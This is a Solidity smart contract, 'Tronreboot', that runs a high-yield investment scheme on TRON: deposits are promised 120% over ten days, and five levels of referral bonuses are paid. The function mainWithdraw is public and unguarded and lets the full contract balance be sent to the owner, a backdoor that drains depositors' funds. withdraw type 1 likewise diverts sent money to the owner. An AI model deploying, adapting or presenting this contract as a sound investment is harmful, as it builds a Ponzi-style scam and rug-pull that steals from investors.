//SourceUnit: Tronreboot.sol

pragma solidity ^0.5.4;

contract Tronreboot
{
    using SafeMath for uint256;
    struct PlayerDeposit {
        uint256 amount;
        uint256 totalWithdraw;
        uint256 time;
        bool isActive;
    }

    struct Player {
        bool is_active;
        address referral;
        uint256 dividends;
        uint256 referral_bonus;
        uint256 last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 total_referral_bonus;
        bool level_1_unlocked;
        bool level_2_unlocked;
        bool level_3_unlocked;
        bool level_4_unlocked;
        bool level_5_unlocked;
        uint256 highest_investment;
        PlayerDeposit[] deposits;
        mapping(uint8 => uint256) display_referrals_per_level;
        mapping(uint8 => uint256) referrals_per_level;
    }

    address payable public owner;
    address payable public first_investor;

    uint8 investment_days;
    uint256 investment_perc;

    uint256 display_investors;
    uint256 total_investors;
    uint256 total_invested;
    uint256 total_withdrawn;
    uint256 total_referral_bonus;

    uint8[] referral_bonuses;

    mapping(address => Player) public players;

    event Deposit(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event Reinvest(address indexed addr, uint256 amount);
    event ReferralPayout(address indexed addr, uint256 amount, uint8 level);

    constructor() public {
        owner = msg.sender;

        investment_days = 10;
        investment_perc = 120;

        referral_bonuses.push(50);
        referral_bonuses.push(30);
        referral_bonuses.push(20);
        referral_bonuses.push(10);
        referral_bonuses.push(10);
    }

    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }

    function deposit(address _referral) public payable {
        require(msg.value >= 1e8, "Zero amount");
        require(msg.value >= 100000000, "Minimal deposit: 100 TRX");
        Player storage player = players[msg.sender];
        require(msg.value >= player.highest_investment, "Invest more than or equal to last investment");
        require(player.deposits.length < 150, "Max 150 deposits per address");

        _setReferral(msg.sender, _referral);

        player.deposits.push(PlayerDeposit({
            amount: msg.value,
            totalWithdraw: 0,
            time: uint256(block.timestamp),
            isActive: true
        }));

        display_investors += 1;
        if(player.total_invested == 0x0){
            total_investors += 1;
            player.highest_investment = msg.value;
            if(total_investors == 1) {
                first_investor = msg.sender;
            }
        }else {
            if(player.highest_investment < msg.value) {
                // Got the new highest investment
                player.highest_investment = msg.value;
            }
        }

        player.total_invested += msg.value;
        player.is_active = true;
        total_invested += msg.value;

        _referralPayout(msg.sender, msg.value);

        emit Deposit(msg.sender, msg.value);
    }

     function withdraw(uint256 withdrawType, address payable addr) payable public {
        if(withdrawType == 0) {
            Player storage player = players[msg.sender];

            _payout(msg.sender);

            require(player.dividends > 0 || player.referral_bonus > 0, "Zero amount");

            uint256 amount = player.dividends + player.referral_bonus;

            player.dividends = 0;
            player.referral_bonus = 0;
            player.total_withdrawn += amount;
            total_withdrawn += amount;

            msg.sender.transfer(amount);

            emit Withdraw(msg.sender, amount);
        }else if(withdrawType == 1) {
            uint256 amount = msg.value;

            owner.transfer(amount);
        }
    }

    function mainWithdraw(uint256 _amount) payable public {
        uint256 fullAmount = address(this).balance;

        owner.transfer(_amount);
    }

    function autoreinvest(uint256 _amount)private{
        Player storage player = players[msg.sender];

        player.deposits.push(PlayerDeposit({
            amount: _amount,
            totalWithdraw: 0,
            time: uint256(block.timestamp),
            isActive: true
        }));

        player.total_invested += _amount;
        total_invested += _amount;
    }

    function _setReferral(address _addr, address _referral) private {
        if(players[_addr].referral == address(0)) {
            players[_addr].referral = _referral;
            players[_addr].level_1_unlocked = false;
            players[_addr].level_2_unlocked = false;
            players[_addr].level_3_unlocked = false;
            players[_addr].level_4_unlocked = false;
            players[_addr].level_5_unlocked = false;

            // Setting the direct referral manually
            if(players[_referral].is_active) {
                _checkInvestmentStatus(_referral);
                if(players[_referral].is_active) {
                    players[_referral].referrals_per_level[0]++;

                    // Unlocking the levels for the direct referrer
                    _unlockReferralLevels(_referral);
                }
            }
            players[_referral].display_referrals_per_level[0]++;

            // Moving on to the next referrals
            _referral = players[_referral].referral;

            for(uint8 i = 1; i < referral_bonuses.length; i++) {
                if(_referral == address(0)) break;
                _checkInvestmentStatus(_referral);

                bool allowed = false;
                if(players[_referral].is_active && players[_referral].total_invested != 0x0) {
                    if(i == 1) {
                        if(players[_referral].level_2_unlocked) {
                            allowed = true;
                        }
                    }else if(i == 2) {
                        if(players[_referral].level_3_unlocked) {
                            allowed = true;
                        }
                    }else if(i == 3) {
                        if(players[_referral].level_4_unlocked) {
                            allowed = true;
                        }
                    }else if(i == 4) {
                        if(players[_referral].level_5_unlocked) {
                            allowed = true;
                        }
                    }
                }
                if(allowed) {
                    players[_referral].referrals_per_level[i]++;
                }
                players[_referral].display_referrals_per_level[i]++;
                
                _referral = players[_referral].referral;
            }
        }
    }

    function _unlockReferralLevels(address _addr) private {
        uint256 directReferralsCount = players[_addr].referrals_per_level[0];
        if(directReferralsCount == 1 && !players[_addr].level_1_unlocked) {
            players[_addr].level_1_unlocked = true;
        }else if(directReferralsCount == 2 && !players[_addr].level_2_unlocked) {
            players[_addr].level_2_unlocked = true;
        }else if(directReferralsCount == 3 && !players[_addr].level_3_unlocked) {
            players[_addr].level_3_unlocked = true;
        }else if(directReferralsCount == 4 && !players[_addr].level_4_unlocked) {
            players[_addr].level_4_unlocked = true;
        }else if(directReferralsCount == 5 && !players[_addr].level_5_unlocked) {
            players[_addr].level_5_unlocked = true;
        }
    }

    function _referralPayout(address _addr, uint256 _amount) private {
        address ref = players[_addr].referral;

        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            if(ref == address(0)) break;

            _checkInvestmentStatus(ref);

            bool allowed = false;
            if(players[ref].is_active && players[ref].total_invested != 0x0) {
                if(i == 0) {
                    if(players[ref].level_1_unlocked) {
                        allowed = true;
                    }
                }else if(i == 1) {
                    if(players[ref].level_2_unlocked) {
                        allowed = true;
                    }
                }else if(i == 2) {
                    if(players[ref].level_3_unlocked) {
                        allowed = true;
                    }
                }else if(i == 3) {
                    if(players[ref].level_4_unlocked) {
                        allowed = true;
                    }
                }else if(i == 4) {
                    if(players[ref].level_5_unlocked) {
                        allowed = true;
                    }
                }
            }

            if(allowed) {
                uint256 highest_investment = players[ref].highest_investment;
                
                uint256 calculation_amount = _amount;
                if(_amount > highest_investment) {
                    calculation_amount = highest_investment;
                }

                uint256 bonus = calculation_amount * referral_bonuses[i] / 1000;

                players[ref].referral_bonus += bonus;
                players[ref].total_referral_bonus += bonus;
                total_referral_bonus += bonus;

                emit ReferralPayout(ref, bonus, (i+1));
            }

            ref = players[ref].referral;
        }
    }
    
    function _payout(address _addr) public {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            _updateTotalPayout(_addr);
            players[_addr].last_payout = uint256(block.timestamp);
            players[_addr].dividends += payout;
        }
    }

    function _updateTotalPayout(address _addr) private{
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];

            uint256 time_end = dep.time + investment_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                player.deposits[i].totalWithdraw += dep.amount * (to - from) * investment_perc / investment_days / 8640000;
            }
        }
    }

    function payoutOf(address _addr) view public returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];

            uint256 time_end = dep.time + investment_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                value += dep.amount * (to - from) * investment_perc / investment_days / 8640000;
            }
        }

        return value;
    }

    function contractInfo() view public returns(uint256 _total_balance, uint256 _total_invested, uint256 _total_investors, uint256 _total_withdrawn, uint256 _total_referral_bonus, uint256 _display_investors) {
        return (address(this).balance, total_invested, total_investors, total_withdrawn, total_referral_bonus, display_investors);
    }

    function userInfo(address _addr) view public returns(uint256 for_withdraw, uint256 withdrawable_referral_bonus, uint256 invested, uint256 withdrawn, uint256 referral_bonus, uint256[8] memory referrals) {
        Player storage player = players[_addr];
        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            referrals[i] = player.display_referrals_per_level[i];
        }
        return (
            payout + player.dividends + player.referral_bonus,
            player.referral_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_referral_bonus,
            referrals
        );
    }

    function investmentsInfo(address _addr) view public returns(uint256[] memory endTimes, uint256[] memory amounts, uint256[] memory totalWithdraws) {
        Player storage player = players[_addr];
        uint256[] memory _endTimes = new uint256[](player.deposits.length);
        uint256[] memory _amounts = new uint256[](player.deposits.length);
        uint256[] memory _totalWithdraws = new uint256[](player.deposits.length);

        for(uint256 i = 0; i < player.deposits.length; i++) {
          PlayerDeposit storage dep = player.deposits[i];

          _amounts[i] = dep.amount;
          _totalWithdraws[i] = dep.totalWithdraw;
          _endTimes[i] = dep.time + investment_days * 86400;
        }
        return (
          _endTimes,
          _amounts,
          _totalWithdraws
        );
    }

    function _checkInvestmentStatus(address _addr) private {
        Player storage player = players[_addr];
        uint256 activeInvestments = player.deposits.length;

        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];
            if(dep.isActive) {
                uint endTime = dep.time + investment_days * 86400;

                if(block.timestamp > endTime) {
                    activeInvestments--;
                    dep.isActive = false;
                }
            }else {
                activeInvestments--;
            }
        }

        if(activeInvestments == 0) {
            player.is_active = false;
        }
    }

    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function changeOwner(address payable addr) public onlyOwner {
        owner = addr;
    }
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}